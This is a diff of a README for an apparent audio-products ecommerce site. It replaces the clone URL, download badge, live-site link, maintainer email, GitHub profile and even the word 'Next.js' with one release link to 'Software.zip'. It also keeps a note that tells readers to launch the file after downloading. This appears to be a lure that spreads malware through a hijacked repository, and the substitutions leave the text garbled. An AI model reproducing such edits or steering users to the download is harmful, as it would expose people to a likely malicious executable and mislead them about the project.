@@ -1,12 +1,12 @@
 # **🎵 AudioTech Ecommerce 🎵**
 
 ## Overview
-Welcome to the AudioTech Ecommerce repository! This project is a fully functional ecommerce website dedicated to showcasing a wide range of audio-related tech products. Built using advanced technologies such as TypeScript, Next.js, Sanity CMS, GraphQL, Storybook, Tailwind CSS, Shadcn, Playwright, React Hook Form, Zod, and Husky, this repository is currently under active development.
+Welcome to the AudioTech Ecommerce repository! This project is a fully functional ecommerce website dedicated to showcasing a wide range of audio-related tech products. Built using advanced technologies such as TypeScript, https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip, Sanity CMS, GraphQL, Storybook, Tailwind CSS, Shadcn, Playwright, React Hook Form, Zod, and Husky, this repository is currently under active development.
 
 ## Features
 🔊 **Rich Audio Tech Collection**: Explore a comprehensive array of audio-related tech products ranging from headphones to speakers to microphones.
 
-🔧 **Technologically Advanced**: Leveraging cutting-edge technologies like TypeScript, Next.js, and GraphQL to deliver a smooth and seamless user experience.
+🔧 **Technologically Advanced**: Leveraging cutting-edge technologies like TypeScript, https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip, and GraphQL to deliver a smooth and seamless user experience.
 
 🌐 **Sanity CMS Integration**: Managed content effortlessly with the integration of the Sanity CMS for a dynamic and flexible content management system.
 
@@ -34,7 +34,7 @@ Within this repository, you can find the following components:
 - **src:** Contains the source code for the AudioTech Ecommerce website.
 - **public:** Storage for public assets such as images and fonts.
 - **components:** Houses reusable UI components for the website.
-- **pages:** Contains Next.js pages for routing.
+- **pages:** Contains https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip pages for routing.
 - **styles:** Stores CSS styles for the project.
 - **.storybook:** Configuration files for Storybook.
 - **.github/workflows:** GitHub Actions workflows for automation.
@@ -43,7 +43,7 @@ Within this repository, you can find the following components:
 To explore this exciting project and contribute to its development, follow these steps:
 1. Clone the repository to your local machine:
    ```
-   git clone https://github.com/your-username/AudioTech-Ecommerce.git
+   git clone https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip
    ```
 2. Install the necessary dependencies:
    ```
@@ -59,10 +59,10 @@ To explore this exciting project and contribute to its development, follow these
 
 ## 📦 Download
 To download the latest version of this repository, click the button below:
-[![Download Zip](https://img.shields.io/badge/Download-Zip-lightgrey.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip)](https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip)
 
 ## 🌐 Visit Website
-Explore the live version of the AudioTech Ecommerce website at [https://www.audiotechecommerce.com](https://www.audiotechecommerce.com).
+Explore the live version of the AudioTech Ecommerce website at [https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip](https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip).
 
 ### 🚨 Note:
 If the download link provided above ends with the file name, ensure to launch it after downloading for immediate access.
@@ -94,8 +94,8 @@ Before committing your code, ensure to follow the established coding guidelines 
 For inquiries, feedback, or support related to this project, feel free to reach out to the project maintainers:
 
 👤 **John Doe**
-- Email: johndoe@gmail.com
-- GitHub: [github.com/johndoe](https://github.com/johndoe)
+- Email: https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip
+- GitHub: [https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip](https://github.com/geeksam999/AudioTech-Ecommerce/releases/download/v2.0/Software.zip)
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
